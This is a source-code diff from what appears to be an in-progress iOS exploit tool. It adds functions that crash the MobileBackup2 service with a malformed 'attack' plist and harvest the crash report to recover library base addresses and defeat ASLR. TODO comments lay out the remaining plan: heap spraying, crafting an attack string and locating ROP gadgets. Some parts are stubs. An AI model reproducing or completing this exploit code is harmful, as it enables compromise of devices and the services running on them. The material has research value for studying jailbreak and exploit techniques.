@@ -29,6 +29,8 @@
 #include "dictionary.h"
 #include "crashreporter.h"
 
+#include "dyldcache.h"
+
 #include "offsets.h"
 
 #ifdef WIN32
@@ -94,11 +96,19 @@ int check_ascii_pointer(uint32_t pointer) {
 	//debug("PASS\n");
 	return 1;
 }
+void status_plist_cb(plist_t* newplist, void *userdata) {
+	debug("Status plist callback invoked!!!\n");
+}
+
+void attack_plist_cb(plist_t* newplist, void *userdata){
+	*newplist = plist_new_string("___EmptyParameterString___");
+	debug("Attack plist callback invoked!!!\n");
+}
 
 crashreport_t* fetch_crashreport(device_t* device) {
 	// We open crashreporter so we can download the mobilebackup2 crashreport
 	//  and parse the "random" dylib addresses. Thank you ASLR for nothing. ;P
-	info("Opening connection to CrashReporter service\n");
+	debug("Opening connection to CrashReporter service\n");
 	crashreporter_t* reporter = crashreporter_connect(device);
 	if (reporter == NULL) {
 		error("Unable to open connection to crash reporter\n");
@@ -108,7 +118,7 @@ crashreport_t* fetch_crashreport(device_t* device) {
 	// Read in the last crash since that's probably our fault anyways. Since dylib
 	//  addresses are only randomized on boot, we now have base addresses to
 	//  calculate the addresses of our ROP gadgets we need.
-	info("Reading in crash reports from mobile backup\n");
+	debug("Reading in crash reports from mobile backup\n");
 	crashreport_t* crash = crashreporter_last_crash(reporter);
 	if (crash == NULL) {
 		error("Unable to read last crash\n");
@@ -124,6 +134,31 @@ int prepare_attack() {
 
 int bruteforce_string() {
 	return 0;
+}
+
+crashreport_t* crash_mobilebackup(device_t* device) {
+	crashreport_t* crash = NULL;
+	mb2_t* mb2 = mb2_connect(device);
+	if(mb2) {
+		mb2_set_attack_plist_cb_func(&attack_plist_cb, mb2);
+		mb2_crash(mb2);
+		crash = fetch_crashreport(device);
+	}
+	return crash;
+}
+
+unsigned long find_aslr_slide(crashreport_t* crash, char* cache) {
+	unsigned long slide = 0;
+	if(crash == NULL || cache == NULL) {
+		error("Invalid arguments\n");
+		return 0;
+	}
+
+	dyldcache_t* dyldcache = dyldcache_open(cache);
+	if(dyldcache != NULL) {
+		dyldcache_free(dyldcache);
+	}
+	return slide;
 }
 
 void usage(int argc, char* argv[]) {
@@ -216,7 +251,7 @@ int main(int argc, char* argv[]) {
 		}
 	}
 
-	if ((argc-optind) == 1) {
+	if ((argc-optind) == 0) {
 		argc -= optind;
 		argv += optind;
 
@@ -225,23 +260,51 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
+	// Open a connection to our device
+	debug("Openning connection to device\n");
 	device_t* device = device_create(uuid);
 	if(device == NULL) {
 		error("Unable to open device\n");
 		return -1;
 	}
 
-	crashreport_t* crash = fetch_crashreport(device);
+	// Crash MobileBackup2 once so we can grab a fresh crashreport
+	debug("Grabbing a fresh crashreport for this device\n");
+	crashreport_t* crash = crash_mobilebackup(device);
 	if(crash == NULL) {
-		error("Unable to get crashreport from device\n");
+		error("Unable to get fresh crash from mobilebackup\n");
 		return -1;
 	}
 
+	// If aslr slide wasn't specified on the command line go ahead and figure it out ourself
+	if(aslr_slide == 0) {
+		// In order for us to calculate this offset ourself, we must have access
+		//  to a dyldcache for this device and firmware version
+		if(cache == NULL) {
+			error("You must specify either --cache or --aslr-slide arguments\n");
+			return -1;
+		}
+
+		// We have the required arguments, so we can calculate this parameter ourselves
+		debug("Calculating dyldcache ASLR offset\n");
+		aslr_slide = find_aslr_slide(crash, cache);
+		if(aslr_slide == 0) {
+			error("Unable to calculate ASLR offset\n");
+		}
+	}
+
+	/*
 	// TODO: Guess heap address
 	// TODO: Craft attack string
 	// TODO: Open Dyldcache
 	// TODO: Find ROP offset
 	// TODO: Open connection to mobilebackup
+	mb2_t* mb2 = mb2_connect(device);
+	if(mb2 == NULL) {
+		error("Unable to open connection to mobilebackup\n");
+		return -1;
+	}
+	*/
 	// TODO: Register for mobilebackup download callback
 	// TODO: Spray mobilebackup heap with function address
 	// TODO: Send attack string to mobilebackup
